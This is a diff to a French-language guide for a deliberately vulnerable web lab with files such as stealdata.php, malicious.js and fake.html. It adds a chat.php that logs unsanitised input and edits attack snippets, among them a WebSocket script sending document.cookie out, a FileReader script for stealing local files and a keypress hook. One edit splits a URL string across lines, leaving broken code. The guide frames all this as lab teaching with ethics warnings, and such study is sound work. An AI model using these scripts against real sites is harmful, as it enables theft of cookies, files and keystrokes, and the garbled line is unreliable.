@@ -12,7 +12,8 @@
 ├── stealdata.php
 ├── malicious.js
 ├── offer.html
-└── fake.html
+├── fake.html
+└── chat.php
 ```
 
 ### Fichiers
@@ -131,6 +132,17 @@ document.onkeypress = function(e) {
     </form>
 </body>
 </html>
+```
+
+#### `chat.php`
+
+```php
+<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
+    $message = $_POST['message'];
+    file_put_contents('chat_log.txt', $message . "\n", FILE_APPEND);
+}
+?>
 ```
 
 ### Instructions d'installation
@@ -292,7 +304,9 @@ document.onkeypress = function(e) {
 - **Utilisation de WebSockets pour exfiltrer des données :**
   ```html
   <script>
-      var ws = new WebSocket('ws://localhost/vulnerable-site/socket');
+      var ws = new WebSocket('ws://localhost/vulner
+
+able-site/socket');
       ws.onopen = function() {
           ws.send('Exfiltrating data...');
           ws.send(document.cookie);
@@ -301,9 +315,7 @@ document.onkeypress = function(e) {
   ```
 
 - **Exploitation de l'API FileReader pour voler des fichiers locaux (avec interaction utilisateur) :**
- 
-
- ```html
+  ```html
   <script>
       var input = document.createElement('input');
       input.type = 'file';
@@ -352,7 +364,7 @@ document.onkeypress = function(e) {
       function sendMessage() {
           var message = document.getElementById('chatInput').value;
           var xhr = new XMLHttpRequest();
-          xhr.open('POST', 'http://localhost/vulnerable-site/chat', true);
+          xhr.open('POST', 'http://localhost/vulnerable-site/chat.php', true);
           xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
           xhr.send('message=' + encodeURIComponent(message));
       }
@@ -371,4 +383,4 @@ document.onkeypress = function(e) {
 - **N'utilisez ces scripts que dans un environnement contrôlé et à des fins éducatives.**
 - **Assurez-vous d'obtenir les permissions nécessaires pour effectuer ces tests sur les systèmes concernés.**
 
-La sécurité informatique est une responsabilité partagée, et l'apprentissage des vulnérabilités doit toujours s'accompagner d'un fort sens de l'éthique et du respect des lois en vigueur.
+# La sécurité informatique est une responsabilité partagée, et l'apprentissage des vulnérabilités doit toujours s'accompagner d'un fort sens de l'éthique et du respect des lois en vigueur.
